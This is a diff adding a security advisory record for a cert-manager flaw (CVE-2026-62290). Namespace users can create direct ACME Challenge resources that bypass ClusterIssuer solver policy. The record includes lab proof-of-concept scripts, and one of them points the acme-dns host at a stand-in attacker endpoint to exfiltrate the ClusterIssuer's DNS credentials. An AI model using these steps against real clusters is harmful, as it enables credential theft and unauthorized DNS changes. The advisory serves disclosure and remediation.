@@ -1,0 +1,97 @@
+{
+  "id": "GHSA-8rvj-mm4h-c258",
+  "modified": "2026-10-29T16:45:05.112882474Z",
+  "published": "2026-10-29T16:39:41Z",
+  "aliases": [
+    "BIT-cert-manager-2026-62290",
+    "CVE-2026-62290"
+  ],
+  "summary": "cert-manager: Direct ACME Challenge resources can bypass Issuer DNS01 solver policy and use ClusterIssuer DNS credentials",
+  "details": "## Summary\n\n`Challenge` resources under `acme.cert-manager.io` can be created directly by namespace users. On create, cert-manager performs no admission validation tying the Challenge to an `Order`, an owner reference, or an Issuer-selected solver. The ACME Challenge controller then reconciles the direct resource and uses `Challenge.spec.solver` as the DNS01 provider configuration.\n\nWhen the direct Challenge references a `ClusterIssuer`, cert-manager derives the DNS provider secret namespace and ambient-credential policy from the `ClusterIssuer` reference, but the DNS provider configuration itself is attacker-controlled through `Challenge.spec.solver`. This lets a namespace user bypass `Issuer`/`ClusterIssuer` solver selectors such as `dnsZones`, `dnsNames`, and `matchLabels`, and make the cert-manager controller use ClusterIssuer DNS credentials for attacker-selected provider settings and DNS names.\n\nIn the acme-dns case, this becomes credential disclosure because the attacker-controlled solver host receives the `X-Api-User` and `X-Api-Key` headers loaded by cert-manager from the ClusterIssuer resource namespace.\n\n## Attack preconditions\n\n- The attacker can create `challenges.acme.cert-manager.io` resources in at least one namespace.\n- The cert-manager controller is running and reconciles ACME `Challenge` resources cluster-wide.\n- A usable `ClusterIssuer` exists in the cluster.\n- The referenced `ClusterIssuer` has a DNS01 solver that uses a Secret in the cluster resource namespace, or relies on ambient credentials enabled for `ClusterIssuer`.\n- The cluster is multi-tenant or otherwise separates namespace users from platform-owned Issuer/ClusterIssuer and DNS credential administration.\n\n## Severity\n\nRationale: a tenant with namespace-level ACME Challenge create permissions, including permissions granted by cert-manager's aggregate edit role, can cause a cluster-scoped controller to use DNS credentials or ambient cloud credentials outside the Issuer's intended solver policy. With acme-dns specifically, this can disclose the referenced acme-dns account credential to an attacker-controlled endpoint. With other DNS providers, the impact is credential use, Issuer policy bypass, and unauthorized DNS mutation risk unless a provider-specific credential disclosure path is separately demonstrated.\n\n## Why this is not just RBAC misconfiguration\n\ncert-manager's documented end-user workflow does not require users to manually create `Challenge` resources. Challenges are internal ACME workflow objects generated from Orders after cert-manager has selected a solver from the referenced Issuer or ClusterIssuer. If default or aggregate roles grant namespace users permission to create these resources, the controller still should not treat a user-controlled `Challenge.spec.solver` as authoritative for a referenced `ClusterIssuer`.\n\nThe security boundary is the Issuer/ClusterIssuer solver policy and credential configuration. Direct Challenge creation bypasses that boundary because the controller derives credential namespace and ambient credential permission from `issuerRef`, while accepting the DNS provider configuration from the untrusted Challenge object.\n\n## Affected components\n\n- ACME Challenge admission validation\n- ACME Challenge controller\n- DNS01 solver selection and DNS provider construction\n- Default aggregate RBAC for `challenges.acme.cert-manager.io`\n\n## Affected versions tested\n\nThe issue was reproduced on:\n\n- `master` commit `2c0f1a6a4`\n- latest production release `v1.20.2` commit `e5b7b1845`\n- `v1.19.5` commit `cda7b7896`\n- `v1.18.6` commit `4699caabb`\n\nSee `VERSION_TEST_MATRIX.md` for the command matrix and outputs.\n\n## Technical details\n\nRelevant code paths:\n\n- `internal/apis/acme/validation/challenge.go:44-45`: `ValidateChallenge` returns no errors on create.\n- `deploy/crds/acme.cert-manager.io_challenges.yaml`: `spec.solver` is a required user-controlled field on `Challenge`.\n- `pkg/controller/acmechallenges/scheduler/scheduler.go:51-58`: scheduler lists all Challenges.\n- `pkg/controller/acmechallenges/controller.go:180-197`: scheduler sets `status.processing=true`.\n- `pkg/controller/acmechallenges/sync.go:139-183`: controller loads the referenced Issuer and then presents the Challenge.\n- `pkg/issuer/acme/dns/dns.go:81`: DNS solver `Present` ignores the issuer object argument.\n- `pkg/issuer/acme/dns/dns.go:180-187`: DNS provider config and resource namespace are derived from `Challenge.spec`.\n- `pkg/controller/helper.go:39-44`: `ClusterIssuer` references use the cluster resource namespace.\n- `pkg/controller/helper.go:66-72`: ambient credentials are allowed based on `issuerRef.kind`.\n- `internal/apis/config/controller/v1alpha1/defaults.go:68-69`: ClusterIssuer ambient credentials default to enabled.\n- `deploy/charts/cert-manager/templates/rbac.yaml:517-519`: the aggregate edit role can create/update `challenges` and `orders`.\n\nThe normal `Order` flow selects a solver from the Issuer:\n\n- `pkg/util/solverpicker/solverpicker.go`: solver selectors are evaluated.\n- `pkg/controller/acmeorders/util.go:94-106`: solvers are fetched from the Issuer and selected.\n- `pkg/controller/acmeorders/util.go:131-142`: the selected solver is copied into the generated Challenge.\n\nThe direct `Challenge` flow skips that selection entirely because the direct object already contains a solver.\n\n## Proof of concept\n\n### PoC A: low-privileged namespace user can persist a direct ClusterIssuer Challenge\n\nThe following script starts k3s in Docker, installs only the relevant CRDs, creates a platform-owned ClusterIssuer, creates a namespace user with Challenge create permission but no secret or ClusterIssuer read permission, and creates a direct DNS01 Challenge referencing that ClusterIssuer and a cluster resource namespace secret.\n\nThe ClusterIssuer is configured to use a legitimate acme-dns host for `victim.example.com`. The direct Challenge uses that same DNS name, but replaces the acme-dns host with an attacker-controlled endpoint. This demonstrates credential disclosure without relying on an out-of-policy DNS name.\n\nA broader DNS policy-bypass variant is also possible when the referenced credential or ambient provider can operate on the attacker-selected DNS name. In that case, the same direct Challenge path bypasses the Issuer/ClusterIssuer solver selectors and provider configuration.\n\nRun from the cert-manager repository root:\n\n```bash\nset -euo pipefail\n\nname=cm-direct-challenge-poc\ndocker rm -f \"$name\" \u003e/dev/null 2\u003e\u00261 || true\ndocker run -d --name \"$name\" --privileged -v \"$PWD\":/repo rancher/k3s:v1.33.4-k3s1 \\\n  server --disable=traefik --disable=servicelb --write-kubeconfig-mode=644 \u003e/dev/null\n\ncleanup() {\n  docker rm -f \"$name\" \u003e/dev/null 2\u003e\u00261 || true\n}\ntrap cleanup EXIT\n\nfor i in $(seq 1 90); do\n  docker exec \"$name\" kubectl get --raw=/readyz \u003e/dev/null 2\u003e\u00261 \u0026\u0026 break\n  sleep 2\ndone\n\ndocker exec \"$name\" kubectl apply -f /repo/deploy/crds/cert-manager.io_clusterissuers.yaml \u003e/dev/null\ndocker exec \"$name\" kubectl apply -f /repo/deploy/crds/acme.cert-manager.io_challenges.yaml \u003e/dev/null\ndocker exec \"$name\" kubectl create ns tenant \u003e/dev/null\ndocker exec \"$name\" kubectl create ns cert-manager \u003e/dev/null\ndocker exec \"$name\" kubectl -n tenant create sa bob \u003e/dev/null\n\ndocker exec \"$name\" kubectl -n cert-manager create secret generic cluster-acmedns-account \\\n  --from-literal=accounts.json='{\"victim.example.com\":{\"username\":\"victim-user\",\"password\":\"victim-pass\",\"fulldomain\":\"x.example.org\",\"subdomain\":\"x\"}}' \u003e/dev/null\n\ndocker exec -i \"$name\" kubectl apply -f - \u003e/dev/null \u003c\u003c'YAML'\napiVersion: cert-manager.io/v1\nkind: ClusterIssuer\nmetadata:\n  name: cluster-prod\nspec:\n  acme:\n    email: admin@example.com\n    server: https://acme-staging-v02.api.letsencrypt.org/directory\n    privateKeySecretRef:\n      name: cluster-prod-account-key\n    solvers:\n    - selector:\n        dnsZones:\n        - victim.example.com\n      dns01:\n        acmeDNS:\n          host: https://legit-acmedns.example\n          accountSecretRef:\n            name: cluster-acmedns-account\n            key: accounts.json\nYAML\n\ndocker exec -i \"$name\" kubectl apply -f - \u003e/dev/null \u003c\u003c'YAML'\napiVersion: rbac.authorization.k8s.io/v1\nkind: Role\nmetadata:\n  name: challenge-create-only\n  namespace: tenant\nrules:\n- apiGroups: [\"acme.cert-manager.io\"]\n  resources: [\"challenges\"]\n  verbs: [\"create\", \"get\", \"list\", \"watch\"]\n---\napiVersion: rbac.authorization.k8s.io/v1\nkind: RoleBinding\nmetadata:\n  name: bob-challenge-create-only\n  namespace: tenant\nsubjects:\n- kind: ServiceAccount\n  name: bob\n  namespace: tenant\nroleRef:\n  apiGroup: rbac.authorization.k8s.io\n  kind: Role\n  name: challenge-create-only\nYAML\n\necho \"bob create challenges: $(docker exec \"$name\" kubectl auth can-i --as=system:serviceaccount:tenant:bob create challenges.acme.cert-manager.io -n tenant)\"\necho \"bob get cert-manager secret: $(docker exec \"$name\" kubectl auth can-i --as=system:serviceaccount:tenant:bob get secret/cluster-acmedns-account -n cert-manager)\"\necho \"bob get clusterissuer: $(docker exec \"$name\" kubectl auth can-i --as=system:serviceaccount:tenant:bob get clusterissuer/cluster-prod 2\u003e/dev/null)\"\necho \"ClusterIssuer solver policy: $(docker exec \"$name\" kubectl get clusterissuer cluster-prod -o jsonpath='{.spec.acme.solvers[0].selector.dnsZones[0]}{\" \"}{.spec.acme.solvers[0].dns01.acmeDNS.host}')\"\n\ndocker exec -i \"$name\" kubectl --as=system:serviceaccount:tenant:bob -n tenant apply -f - \u003c\u003c'YAML'\napiVersion: acme.cert-manager.io/v1\nkind: Challenge\nmetadata:\n  name: direct-dns01\nspec:\n  authorizationURL: https://attacker.example/acme/authz/1\n  dnsName: victim.example.com\n  issuerRef:\n    group: cert-manager.io\n    kind: ClusterIssuer\n    name: cluster-prod\n  key: attacker-key\n  token: attacker-token\n  type: DNS-01\n  url: https://attacker.example/acme/chal/1\n  solver:\n    dns01:\n      acmeDNS:\n        host: https://attacker.example/acmedns\n        accountSecretRef:\n          name: cluster-acmedns-account\n          key: accounts.json\nYAML\n\ndocker exec \"$name\" kubectl -n tenant get challenge direct-dns01 \\\n  -o jsonpath='{.spec.issuerRef.kind}{\" \"}{.spec.dnsName}{\" \"}{.spec.solver.dns01.acmeDNS.host}{\" \"}{.spec.solver.dns01.acmeDNS.accountSecretRef.name}{\"\\n\"}'\n```\n\nExpected output:\n\n```text\nbob create challenges: yes\nbob get cert-manager secret: no\nbob get clusterissuer: no\nClusterIssuer solver policy: victim.example.com https://legit-acmedns.example\nchallenge.acme.cert-manager.io/direct-dns01 created\nClusterIssuer victim.example.com https://attacker.example/acmedns cluster-acmedns-account\n```\n\nThis proves that the API accepts the direct object from a user who cannot read the target secret or ClusterIssuer.\n\n### PoC B: acme-dns provider sends referenced credentials to the configured host\n\nThis self-contained unit PoC demonstrates the concrete acme-dns impact: the acme-dns provider uses the configured host and sends credentials from account JSON as HTTP headers.\n\nRun from repository root:\n\n```bash\nset -euo pipefail\n\ncat \u003e pkg/issuer/acme/dns/acmedns/direct_challenge_exfil_tmp_test.go \u003c\u003c'EOF'\npackage acmedns\n\nimport (\n        \"context\"\n        \"net/http\"\n        \"net/http/httptest\"\n        \"testing\"\n)\n\nfunc TestTmpAcmeDNSPresentSendsAccountSecretToConfiguredHost(t *testing.T) {\n        var gotUser, gotKey, gotPath string\n\n        ts := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {\n                gotPath = r.URL.Path\n                gotUser = r.Header.Get(\"X-Api-User\")\n                gotKey = r.Header.Get(\"X-Api-Key\")\n                w.Header().Set(\"Content-Type\", \"application/json\")\n                w.WriteHeader(http.StatusOK)\n                w.Write([]byte(`{\"txt\":\"ok\"}`))\n        }))\n        defer ts.Close()\n\n        accountJSON := []byte(`{\n                \"victim.example.com\": {\n                        \"username\": \"victim-user\",\n                        \"password\": \"victim-pass\",\n                        \"fulldomain\": \"x.example.org\",\n                        \"subdomain\": \"x\"\n                }\n        }`)\n\n        provider, err := NewDNSProviderHostBytes(ts.URL, accountJSON, nil)\n        if err != nil {\n                t.Fatal(err)\n        }\n\n        if err := provider.Present(context.Background(), \"victim.example.com\", \"\", \"txt-value\"); err != nil {\n                t.Fatal(err)\n        }\n\n        if gotPath != \"/update\" {\n                t.Fatalf(\"path = %q, want /update\", gotPath)\n        }\n        if gotUser != \"victim-user\" {\n                t.Fatalf(\"X-Api-User = %q, want victim-user\", gotUser)\n        }\n        if gotKey != \"victim-pass\" {\n                t.Fatalf(\"X-Api-Key = %q, want victim-pass\", gotKey)\n        }\n}\nEOF\n\ndocker run --rm \\\n  -v \"$PWD\":/repo \\\n  -v /tmp/cert-manager-gomod-cache:/go/pkg/mod \\\n  -v /tmp/cert-manager-gobuild-cache:/root/.cache/go-build \\\n  -w /repo golang:1.26-bookworm \\\n  go test ./pkg/issuer/acme/dns/acmedns \\\n  -run TestTmpAcmeDNSPresentSendsAccountSecretToConfiguredHost \\\n  -count=1 -v\n\nrm pkg/issuer/acme/dns/acmedns/direct_challenge_exfil_tmp_test.go\n```\n\nExpected output:\n\n```text\n=== RUN   TestTmpAcmeDNSPresentSendsAccountSecretToConfiguredHost\n--- PASS: TestTmpAcmeDNSPresentSendsAccountSecretToConfiguredHost\n```\n\nCombined with PoC A and the code path in `pkg/issuer/acme/dns/dns.go`, this shows that a direct Challenge can select an attacker-controlled acme-dns host while causing cert-manager to load account JSON from the ClusterIssuer resource namespace.\n\n## Credential impact scope\n\nThe concrete credential-disclosure proof in this report is for the acme-dns provider: the attacker-controlled `host` receives the `X-Api-User` and `X-Api-Key` values loaded from the referenced account JSON.\n\nFor other DNS01 providers, this report should be read as credential use, policy bypass, and DNS mutation risk. The controller may use platform-owned secrets or ambient cloud credentials to perform DNS operations selected by the attacker-controlled Challenge. Provider-specific credential disclosure should not be assumed without a separate provider-level PoC.\n\n## Expected behavior\n\nUsers should not be able to create standalone `Challenge` resources that cause cert-manager to use arbitrary solver configuration under the authority of a referenced Issuer or ClusterIssuer. If direct `Challenge` resources are intentionally exposed, the controller should only reconcile Challenges that are owned by cert-manager-created Orders and whose solver config was selected from the referenced Issuer.\n\n## Actual behavior\n\nA user with namespace-level Challenge create permission can create a direct Challenge with arbitrary solver configuration. The controller reconciles it, derives credential namespace and ambient credential permission from `issuerRef`, and uses attacker-controlled provider settings.\n\n## Suggested remediation\n\nPossible mitigations:\n\n- Reject or ignore standalone user-created `Challenge` resources unless the controller or admission layer can confirm an existing cert-manager-created `Order` that owns the Challenge.\n- Do not rely only on the presence of an owner reference. Verify the referenced Order exists, is controlled by cert-manager's Order flow, and matches the Challenge by UID, owner reference, labels, DNS name, authorization URL, challenge URL, token/key material, and issuer reference.\n- Ensure the solver used by the Challenge was selected from the referenced Issuer/ClusterIssuer by the Order controller. The Challenge controller should not accept manually supplied solver provider configuration outside the Order-controller path.\n- Move `Challenge` and `Order` creation permissions out of aggregate `edit` unless direct use is a supported security boundary.\n- Add admission validation or CEL rules preventing direct user control over sensitive solver provider fields on standalone or unverifiable Challenges.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/cert-manager/cert-manager",
+        "purl": "pkg:golang/github.com/cert-manager/cert-manager"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "1.18.0"
+            },
+            {
+              "fixed": "1.19.6"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-8rvj-mm4h-c258/GHSA-8rvj-mm4h-c258.json"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/cert-manager/cert-manager",
+        "purl": "pkg:golang/github.com/cert-manager/cert-manager"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "1.20.0-alpha.0"
+            },
+            {
+              "fixed": "1.20.3"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-8rvj-mm4h-c258/GHSA-8rvj-mm4h-c258.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/cert-manager/cert-manager/security/advisories/GHSA-8rvj-mm4h-c258"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-62290"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/cert-manager/cert-manager/pull/8940"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/cert-manager/cert-manager/pull/8941"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/cert-manager/cert-manager/commit/6bda47297c8fbc6b121b8b76624b668d26f1a155"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/cert-manager/cert-manager/commit/b37dbf01ecea50a0b3a19df0a7fe4c5ad6803f16"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/cert-manager/cert-manager"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/cert-manager/cert-manager/releases/tag/v1.19.6"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/cert-manager/cert-manager/releases/tag/v1.20.3"
+    }
+  ]
+}
